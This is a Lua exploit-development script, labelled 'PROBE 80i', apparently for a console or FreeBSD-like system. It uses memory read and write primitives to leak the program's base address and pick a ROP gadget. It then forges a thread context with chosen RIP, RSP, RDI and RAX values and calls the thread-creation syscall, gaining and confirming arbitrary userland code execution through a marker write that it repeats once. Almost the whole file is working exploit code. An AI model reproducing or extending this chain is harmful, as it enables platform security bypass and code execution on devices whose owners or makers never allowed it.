-- CRASH_CLASS: MODERATE
-- PROBE 80i: Thread write — correct RDI offset (+0x48)
--
-- 80f: RIP=+0xE0, CS=+0xE8(0x43), SS=+0x100(0x3B), mc_len=+0x108(0x480)
-- 80h: RDI=+0x48, RAX=+0x80
-- 80g/80h: getcontext-based context gets rv=0

print("=== PROBE 80i: THREAD WRITE FINAL ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] pid=" .. tostring(syscall.sc_getpid():tonumber()))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

local mov_rdi_eax = eboot + 0x92C68
local ret_gadget = eboot + 0x42
print("[*] gadget=" .. q(mov_rdi_eax))

-- Marker
local marker = memory.alloc(16)
zero(marker, 16)
wd(marker, 0x41414141)
print("[*] marker=" .. q(marker))

-- Stack
local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local stack_top = stack_base + (3 * 0x4000)
zero(stack_top, 0x100)

-- Get valid context via getcontext
local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
local sc_getctx = make_syscall(421)
pcall(function() sc_getctx(uint64(ctx)) end)

-- Verify CS
print("[*] CS=0x" .. string.format("%X", rd(ctx + 0xE8) or 0))

-- Set thread entry: mov [rdi], eax; ret
wq(ctx + 0xE0, mov_rdi_eax)    -- RIP
wq(ctx + 0xF8, stack_top)      -- RSP (ret into 0 after gadget)

-- CORRECT register offsets from 80h
wq(ctx + 0x48, marker)                -- RDI = marker address
wq(ctx + 0x80, uint64(0xDEADBEEF))   -- RAX = 0xDEADBEEF

print("[*] RDI(+0x48)=" .. q(marker))
print("[*] RAX(+0x80)=0xDEADBEEF")
print("[*] RIP(+0xE0)=" .. q(mov_rdi_eax))
print("[*] RSP(+0xF8)=" .. q(stack_top))

-- Create thread
local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

print("[*] calling thr_create...")

-- Flush before syscall (the syscall itself dumps binary via loader internals)
io.stdout:flush()

local ok_call = pcall(function()
    local sc = make_syscall(430)
    sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)

-- Wait for thread before printing anything
local dummy = 0
for i = 1, 5000000 do dummy = dummy + 1 end

-- Now print results
print("")
print("--- RESULTS ---")
print("[*] pcall_ok=" .. tostring(ok_call))
print("[*] tid=" .. q(rq(tid_buf)))

-- Check marker
local mval = rd(marker)
print("[*] MARKER = 0x" .. string.format("%08X", mval or 0))

if mval == 0xDEADBEEF then
    print("")
    print("****************************************************")
    print("*** DEADBEEF — THREAD WROTE TO MEMORY!           ***")
    print("*** ARBITRARY USERLAND CODE EXECUTION CONFIRMED!  ***")
    print("****************************************************")
    print("")

    -- Verify with second write
    wd(marker + 4, 0)
    zero(ctx, 0x600)
    pcall(function() sc_getctx(uint64(ctx)) end)
    wq(ctx + 0xE0, mov_rdi_eax)
    wq(ctx + 0xF8, stack_top)
    zero(stack_top, 0x100)
    wq(ctx + 0x48, marker + 4)
    wq(ctx + 0x80, uint64(0xCAFEBABE))
    zero(tid_buf, 8)
    pcall(function() make_syscall(430)(uint64(ctx), uint64(tid_buf), uint64(0)) end)
    for i = 1, 5000000 do dummy = dummy + 1 end
    print("[*] second write: 0x" .. string.format("%08X", rd(marker + 4) or 0))
    if rd(marker + 4) == 0xCAFEBABE then
        print("[*] *** REPEATABLE WRITE CONFIRMED ***")
    end
elseif mval ~= 0x41414141 then
    print("[*] marker changed to 0x" .. string.format("%08X", mval) .. " — partial exec?")
else
    print("[*] marker unchanged — thread may not have executed")
end

local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("[*] canary=" .. tostring(alive))
print("=== PROBE 80i COMPLETE ===")
